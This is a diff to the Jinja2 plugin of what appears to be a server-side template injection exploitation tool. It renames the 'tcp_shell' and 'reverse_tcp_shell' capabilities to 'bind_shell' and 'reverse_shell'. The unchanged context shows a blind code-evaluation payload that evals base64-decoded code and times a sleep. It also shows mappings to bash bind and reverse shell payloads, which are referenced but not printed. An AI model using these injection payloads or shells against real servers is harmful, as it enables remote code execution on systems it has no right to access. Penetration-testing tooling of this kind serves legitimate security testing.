@@ -49,13 +49,13 @@ class Jinja2(Plugin):
             'call': 'evaluate',
             'evaluate_blind': """eval(__import__('base64').urlsafe_b64decode('%(code_b64)s')) and __import__('time').sleep(%(delay)i)"""
         },
-        'tcp_shell' : {
+        'bind_shell' : {
             'call' : 'execute_blind',
-            'tcp_shell': languages.bash_tcp_shell
+            'bind_shell': languages.bash_bind_shell
         },
-        'reverse_tcp_shell' : {
+        'reverse_shell' : {
             'call': 'execute_blind',
-            'reverse_tcp_shell' : languages.bash_reverse_tcp_shell
+            'reverse_shell' : languages.bash_reverse_shell
         },
         'execute_blind' : {
             'call': 'inject',
@@ -115,8 +115,8 @@ class Jinja2(Plugin):
                 expected_rand = str(rand.randint_n(2))
                 if expected_rand == self.execute('echo %s' % expected_rand):
                     self.set('execute', True)
-                    self.set('tcp_shell', True)
-                    self.set('reverse_tcp_shell', True)
+                    self.set('bind_shell', True)
+                    self.set('reverse_shell', True)
 
 
     def blind_detected(self):
@@ -130,5 +130,5 @@ class Jinja2(Plugin):
         if self.execute_blind('echo %s' % str(rand.randint_n(2))):
             self.set('execute_blind', True)
             self.set('write', True)
-            self.set('tcp_shell', True)
-            self.set('reverse_tcp_shell', True)
+            self.set('bind_shell', True)
+            self.set('reverse_shell', True)
